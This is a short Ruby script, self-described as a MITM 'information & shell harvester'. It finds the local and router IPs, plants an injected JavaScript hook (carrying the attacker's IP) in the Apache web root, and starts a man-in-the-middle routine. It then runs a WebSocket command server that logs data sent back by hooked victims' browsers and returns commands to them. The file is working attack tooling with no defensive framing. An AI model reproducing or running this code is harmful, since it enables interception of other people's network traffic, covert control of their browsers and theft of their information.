require 'em-websocket'
require 'colorize'

# mariachi v0.9
# automatic mitm information & shell harvester

current_action = ''

# <configuration>
apache_webdir = '/var/www/html'
logfile = '/var/log/mariachi.log'
# </configuration>

myip = `echo $(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')`.chop
routerip = `nmap -sP $(route -n | tail -n1 | awk '{ print $1 }')'/24' | grep -i 'scan rep' | awk '{ print $5 }' | head -n1`.chop

IO.write(apache_webdir + '/mariachi.js', IO.read('lib/mariachi.js').gsub('{MYIP}', myip))
sleep(2)
system('mariachi-init')

EM.run {
  EM::WebSocket.run(:host => '0.0.0.0', :port => 8441) do |ws|
    ws.onmessage { |msg|
      if(!msg.match(/^PING|FIN/))
        open(logfile, 'a') do |f|
          f.puts msg
        end
        puts msg.bold.colorize(:red)
      end
      if(msg.match(/^FINEV/))
        if(current_action.split(':')[0].match(msg.split(':')[1]))
          current_action = 'PING'
        end
      end
      ws.send(current_action)
    }
  end
}